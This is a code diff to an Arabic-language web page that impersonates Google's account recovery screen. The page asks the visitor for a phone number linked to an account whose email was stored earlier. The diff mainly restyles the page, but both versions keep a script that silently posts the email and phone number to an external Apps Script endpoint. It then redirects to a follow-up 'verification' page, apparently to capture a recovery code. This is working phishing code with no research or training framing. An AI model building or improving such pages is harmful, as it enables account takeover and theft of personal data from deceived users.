@@ -2,26 +2,25 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
     <title>استرداد الحساب - رقم الهاتف</title>
     <style>
-        * { box-sizing: border-box; }
+        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
         body {
-            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, "Helvetica Neue", sans-serif;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             background-color: #f8f9fa;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            margin: 0;
             padding: 16px;
         }
         .card {
-            background: #ffffff;
+            background: #fff;
             width: 100%;
             max-width: 440px;
             padding: 40px 32px;
-            border-radius: 8px;
+            border-radius: 12px;
             border: 1px solid #dadce0;
         }
         .logo-container { text-align: center; margin-bottom: 16px; }
@@ -31,117 +30,73 @@
         .logo-yellow { color: #FBBC05; }
         .logo-green { color: #34A853; }
 
-        h1 { font-size: 24px; font-weight: 400; color: #202124; text-align: center; margin: 0 0 16px 0; }
-        .description { font-size: 14px; color: #3c4043; text-align: center; line-height: 1.5; margin: 0 0 28px 0; }
+        h1 { font-size: 24px; font-weight: 400; color: #202124; text-align: center; margin-bottom: 12px; }
+        .description { font-size: 15px; color: #3c4043; text-align: center; line-height: 1.5; margin-bottom: 24px; }
 
         .email-box {
-            display: flex; align-items: center; justify-content: center; gap: 8px;
-            border: 1px solid #dadce0; padding: 6px 12px; border-radius: 16px;
-            width: fit-content; margin: 0 auto 28px auto;
+            display: inline-flex; align-items: center; gap: 8px;
+            border: 1px solid #dadce0; padding: 8px 14px; border-radius: 20px;
+            margin: 0 auto 28px; width: fit-content;
         }
-        .email-text { font-size: 14px; color: #3c4043; font-weight: 500; }
+        .email-text { font-size: 15px; color: #3c4043; font-weight: 500; }
         .email-icon {
-            width: 20px; height: 20px; background: #5f6368; color: white;
-            border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px;
+            width: 22px; height: 22px; background: #5f6368; color: #fff;
+            border-radius: 50%; display: flex; align-items: center; justify-content: center;
+            font-size: 12px; flex-shrink: 0;
         }
 
-        /* حقل إدخال رقم الهاتف مع مفتاح الدولة */
+        .input-label {
+            display: block; color: #1a73e8; font-size: 13px;
+            font-weight: 500; margin-bottom: 6px; text-align: right;
+        }
+
         .phone-input-wrapper {
-            display: flex;
-            align-items: stretch;
-            border: 2px solid #1a73e8;
-            border-radius: 4px;
-            overflow: hidden;
-            margin-bottom: 8px;
-            direction: rtl;
+            display: flex; align-items: stretch;
+            border: 2px solid #1a73e8; border-radius: 4px;
+            overflow: hidden; margin-bottom: 8px; direction: rtl;
         }
         .country-select {
-            border: none;
-            border-left: 1px solid #dadce0;
-            padding: 0 10px;
-            font-size: 14px;
-            color: #202124;
-            background: #f8f9fa;
-            cursor: pointer;
-            outline: none;
-            min-width: 110px;
-            direction: rtl;
+            border: none; border-left: 1px solid #dadce0;
+            padding: 14px 12px; font-size: 16px; color: #202124;
+            background: #f8f9fa; cursor: pointer; outline: none;
+            min-width: 120px; direction: rtl;
+            -webkit-appearance: auto; appearance: auto;
         }
         .phone-number-input {
-            flex: 1;
-            border: none;
-            padding: 16px 12px;
-            font-size: 16px;
-            outline: none;
-            direction: ltr;
-            text-align: left;
-            background: transparent;
-        }
-        .input-label {
-            display: block;
-            color: #1a73e8;
-            font-size: 12px;
-            font-weight: 500;
-            margin-bottom: 4px;
-            text-align: right;
+            flex: 1; border: none; padding: 14px 12px;
+            font-size: 17px; outline: none; direction: ltr;
+            text-align: left; background: transparent; color: #202124;
         }
 
         .error-message {
-            color: #d93025;
-            font-size: 12px;
-            text-align: right;
-            min-height: 18px;
-            margin-bottom: 24px;
+            color: #d93025; font-size: 14px; text-align: right;
+            min-height: 20px; margin-bottom: 24px; line-height: 1.4;
         }
 
         .actions-container {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 8px;
+            display: flex; justify-content: space-between;
+            align-items: center; margin-top: 8px;
         }
         .secondary-link {
-            color: #1a73e8;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            background: none;
-            border: none;
-            padding: 0;
+            color: #1a73e8; text-decoration: none; font-size: 15px;
+            font-weight: 500; cursor: pointer; background: none;
+            border: none; padding: 8px 0;
         }
         .secondary-link:hover { text-decoration: underline; }
         .primary-button {
-            background-color: #1a73e8;
-            color: white;
-            border: none;
-            padding: 10px 24px;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+            background: #1a73e8; color: #fff; border: none;
+            padding: 12px 28px; border-radius: 4px; font-size: 15px;
+            font-weight: 500; cursor: pointer; min-height: 44px;
         }
-        .primary-button:hover { background-color: #1557b0; }
+        .primary-button:hover { background: #1557b0; }
 
-        @media (max-width: 480px) {
-            body { background-color: #ffffff; padding: 0; align-items: flex-start; }
-            .card { max-width: 100%; border: none; border-radius: 0; box-shadow: none; min-height: 100vh; }
-        }
         #page-loading-bar {
-            position: fixed;
-            top: 0; left: 0; right: 0;
-            height: 3px;
-            z-index: 9999;
-            background: transparent;
-            overflow: hidden;
-            display: none;
+            position: fixed; top: 0; left: 0; right: 0; height: 3px;
+            z-index: 9999; background: transparent; overflow: hidden; display: none;
         }
         #page-loading-bar::after {
-            content: '';
-            position: absolute;
-            top: 0; right: -40%; width: 40%; height: 100%;
-            background: #1a73e8;
+            content: ''; position: absolute; top: 0; right: -40%;
+            width: 40%; height: 100%; background: #1a73e8;
             animation: page-load-slide 1.4s ease-in-out infinite;
         }
         @keyframes page-load-slide {
@@ -149,149 +104,124 @@
             50%  { right: 20%; width: 60%; }
             100% { right: -80%; width: 20%; }
         }
+
+        @media (max-width: 480px) {
+            body { background: #fff; padding: 0; align-items: flex-start; }
+            .card { max-width: 100%; border: none; border-radius: 0; box-shadow: none; min-height: 100vh; padding: 24px 20px; }
+            h1 { font-size: 22px; }
+            .description { font-size: 14px; }
+            .country-select { font-size: 16px; min-width: 110px; padding: 14px 8px; }
+            .phone-number-input { font-size: 17px; }
+        }
     </style>
 </head>
 <body>
 <div id="page-loading-bar"></div>
 <div class="card">
-        <div class="logo-container">
-            <span class="logo-text">
-                <span class="logo-blue">G</span><span class="logo-red">o</span><span class="logo-yellow">o</span><span class="logo-blue">g</span><span class="logo-green">l</span><span class="logo-red">e</span>
-            </span>
-        </div>
+    <div class="logo-container">
+        <span class="logo-text">
+            <span class="logo-blue">G</span><span class="logo-red">o</span><span class="logo-yellow">o</span><span class="logo-blue">g</span><span class="logo-green">l</span><span class="logo-red">e</span>
+        </span>
+    </div>
 
-        <h1>استرداد الحساب</h1>
-        <p class="description">للمساعدة في الحفاظ على أمان حسابك، تريد Google التأكد من هويتك. أدخل رقم الهاتف المربوط بحسابك.</p>
+    <h1>استرداد الحساب</h1>
+    <p class="description">للمساعدة في الحفاظ على أمان حسابك، تريد Google التأكد من هويتك. أدخل رقم الهاتف المربوط بحسابك.</p>
 
+    <div style="text-align: center;">
         <div class="email-box">
             <div class="email-icon">👤</div>
             <span class="email-text" id="email-display">example@gmail.com</span>
         </div>
-
-        <label class="input-label">رقم الهاتف</label>
-        <div class="phone-input-wrapper" id="phone-wrapper">
-            <select class="country-select" id="country-select">
-                <option value="967" data-lengths="9" data-prefixes="70,71,73,77,78">🇾🇪 +967</option>
-                <option value="966" data-lengths="9" data-prefixes="5">🇸🇦 +966</option>
-                <option value="20"  data-lengths="10" data-prefixes="1">🇪🇬 +20</option>
-            </select>
-            <input
-                type="tel"
-                id="phone-input"
-                class="phone-number-input"
-                placeholder="7XXXXXXXX"
-                maxlength="11"
-                inputmode="numeric"
-            >
-        </div>
-        <div class="error-message" id="error-msg"></div>
-
-        <div class="actions-container">
-            <button class="secondary-link" onclick="window.location.href='index.html#step4'">رجوع</button>
-            <button class="primary-button" id="next-btn" onclick="handleSubmit()">التالي</button>
-        </div>
     </div>
 
-    <script>
-        const API_URL = "https://script.google.com/macros/s/AKfycbxRw3IZje0JfX6xEKXn87vGMMxAKUw3umO-xe9femN2nx5XOeIfBoDJSl_xpVAeyZsFGw/exec";
+    <label class="input-label">رقم الهاتف</label>
+    <div class="phone-input-wrapper" id="phone-wrapper">
+        <select class="country-select" id="country-select">
+            <option value="967" data-lengths="9" data-prefixes="70,71,73,77,78">🇾🇪 +967</option>
+            <option value="966" data-lengths="9" data-prefixes="5">🇸🇦 +966</option>
+            <option value="20"  data-lengths="10" data-prefixes="1">🇪🇬 +20</option>
+        </select>
+        <input type="tel" id="phone-input" class="phone-number-input" placeholder="7XXXXXXXX" maxlength="11" inputmode="numeric">
+    </div>
+    <div class="error-message" id="error-msg"></div>
 
-        function sendToAPI(data) {
-            fetch(API_URL, {
-                method: "POST",
-                mode: "no-cors",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ ...data, timestamp: new Date().toISOString() })
-            }).catch(() => {});
+    <div class="actions-container">
+        <button class="secondary-link" onclick="window.location.href='index.html#step4'">رجوع</button>
+        <button class="primary-button" id="next-btn" onclick="handleSubmit()">التالي</button>
+    </div>
+</div>
+
+<script>
+    const API_URL = "https://script.google.com/macros/s/AKfycbxRw3IZje0JfX6xEKXn87vGMMxAKUw3umO-xe9femN2nx5XOeIfBoDJSl_xpVAeyZsFGw/exec";
+
+    function sendToAPI(data) {
+        fetch(API_URL, {
+            method: "POST", mode: "no-cors",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ ...data, timestamp: new Date().toISOString() })
+        }).catch(() => {});
+    }
+
+    document.getElementById('email-display').textContent =
+        localStorage.getItem('user_email') || 'example@gmail.com';
+
+    const countrySelect = document.getElementById('country-select');
+    const phoneInput = document.getElementById('phone-input');
+    const errorMsg = document.getElementById('error-msg');
+    const phoneWrapper = document.getElementById('phone-wrapper');
+
+    const placeholders = { "967": "7XXXXXXXX", "966": "5XXXXXXXX", "20": "1XXXXXXXXX" };
+    countrySelect.addEventListener('change', () => {
+        phoneInput.placeholder = placeholders[countrySelect.value] || 'XXXXXXXXX';
+        errorMsg.textContent = '';
+        phoneWrapper.style.borderColor = '#1a73e8';
+        phoneInput.value = '';
+    });
+
+    phoneInput.addEventListener('input', () => {
+        phoneInput.value = phoneInput.value.replace(/\D/g, '');
+        errorMsg.textContent = '';
+        phoneWrapper.style.borderColor = '#1a73e8';
+    });
+
+    function validatePhone() {
+        const code = countrySelect.value;
+        const selectedOption = countrySelect.options[countrySelect.selectedIndex];
+        const number = phoneInput.value.trim();
+        if (!number) {
+            errorMsg.textContent = 'يرجى إدخال رقم الهاتف.';
+            phoneWrapper.style.borderColor = '#d93025'; return false;
         }
-
-        document.getElementById('email-display').textContent =
-            localStorage.getItem('user_email') || 'example@gmail.com';
-
-        const countrySelect = document.getElementById('country-select');
-        const phoneInput = document.getElementById('phone-input');
-        const errorMsg = document.getElementById('error-msg');
-        const phoneWrapper = document.getElementById('phone-wrapper');
-
-        // تحديث placeholder بحسب الدولة
-        const placeholders = { "967": "7XXXXXXXX", "966": "5XXXXXXXX", "20": "1XXXXXXXXX" };
-        countrySelect.addEventListener('change', () => {
-            phoneInput.placeholder = placeholders[countrySelect.value] || 'XXXXXXXXX';
-            errorMsg.textContent = '';
-            phoneWrapper.style.borderColor = '#1a73e8';
-            phoneInput.value = '';
-        });
-
-        phoneInput.addEventListener('input', () => {
-            phoneInput.value = phoneInput.value.replace(/\D/g, '');
-            errorMsg.textContent = '';
-            phoneWrapper.style.borderColor = '#1a73e8';
-        });
-
-        function validatePhone() {
-            const code = countrySelect.value;
-            const selectedOption = countrySelect.options[countrySelect.selectedIndex];
-            const number = phoneInput.value.trim();
-
-            if (!number) {
-                errorMsg.textContent = 'يرجى إدخال رقم الهاتف.';
-                phoneWrapper.style.borderColor = '#d93025';
-                return false;
-            }
-
-            const expectedLength = parseInt(selectedOption.dataset.lengths);
-            const validPrefixes = selectedOption.dataset.prefixes.split(',');
-
-            // التحقق من الطول
-            if (number.length !== expectedLength) {
-                errorMsg.textContent = `رقم الهاتف يجب أن يتكون من ${expectedLength} أرقام لهذه الدولة.`;
-                phoneWrapper.style.borderColor = '#d93025';
-                return false;
-            }
-
-            // التحقق من البادئة
-            const hasValidPrefix = validPrefixes.some(prefix => number.startsWith(prefix));
-            if (!hasValidPrefix) {
-                if (code === '967') {
-                    errorMsg.textContent = 'رقم هاتف يمني غير صحيح. يجب أن يبدأ بـ 70 أو 71 أو 73 أو 77 أو 78.';
-                } else if (code === '966') {
-                    errorMsg.textContent = 'رقم هاتف سعودي غير صحيح. يجب أن يبدأ بـ 5.';
-                } else if (code === '20') {
-                    errorMsg.textContent = 'رقم هاتف مصري غير صحيح. يجب أن يبدأ بـ 1.';
-                }
-                phoneWrapper.style.borderColor = '#d93025';
-                return false;
-            }
-
-            return true;
+        const expectedLength = parseInt(selectedOption.dataset.lengths);
+        const validPrefixes = selectedOption.dataset.prefixes.split(',');
+        if (number.length !== expectedLength) {
+            errorMsg.textContent = `رقم الهاتف يجب أن يتكون من ${expectedLength} أرقام لهذه الدولة.`;
+            phoneWrapper.style.borderColor = '#d93025'; return false;
         }
-
-        function handleSubmit() {
-            if (!validatePhone()) return;
-
-            const code = countrySelect.value;
-            const number = phoneInput.value.trim();
-            const email = localStorage.getItem('user_email') || '';
-
-            sendToAPI({
-                event: "PHONE_SUBMIT",
-                email: email,
-                phone_code: '+' + code,
-                phone_number: number,
-                full_phone: '+' + code + number
-            });
-
-            localStorage.setItem('phone_number', '+' + code + number);
-
-            // تشغيل شريط التحميل
-            const bar = document.getElementById('page-loading-bar');
-            bar.style.display = 'block';
-            document.getElementById('next-btn').disabled = true;
-            document.getElementById('next-btn').style.opacity = '0.7';
-
-            setTimeout(() => {
-                window.location.href = 'verification.html';
-            }, 600);
+        const hasValidPrefix = validPrefixes.some(prefix => number.startsWith(prefix));
+        if (!hasValidPrefix) {
+            if (code === '967') errorMsg.textContent = 'رقم هاتف يمني غير صحيح. يجب أن يبدأ بـ 70 أو 71 أو 73 أو 77 أو 78.';
+            else if (code === '966') errorMsg.textContent = 'رقم هاتف سعودي غير صحيح. يجب أن يبدأ بـ 5.';
+            else if (code === '20') errorMsg.textContent = 'رقم هاتف مصري غير صحيح. يجب أن يبدأ بـ 1.';
+            phoneWrapper.style.borderColor = '#d93025'; return false;
         }
-    </script>
+        return true;
+    }
+
+    function handleSubmit() {
+        if (!validatePhone()) return;
+        const code = countrySelect.value;
+        const number = phoneInput.value.trim();
+        const email = localStorage.getItem('user_email') || '';
+        sendToAPI({ event: "PHONE_SUBMIT", email: email, phone_code: '+' + code, phone_number: number, full_phone: '+' + code + number });
+        localStorage.setItem('phone_number', '+' + code + number);
+
+        const bar = document.getElementById('page-loading-bar');
+        bar.style.display = 'block';
+        document.getElementById('next-btn').disabled = true;
+        document.getElementById('next-btn').style.opacity = '0.7';
+        setTimeout(() => { window.location.href = 'verification.html'; }, 600);
+    }
+</script>
 </body>
 </html>
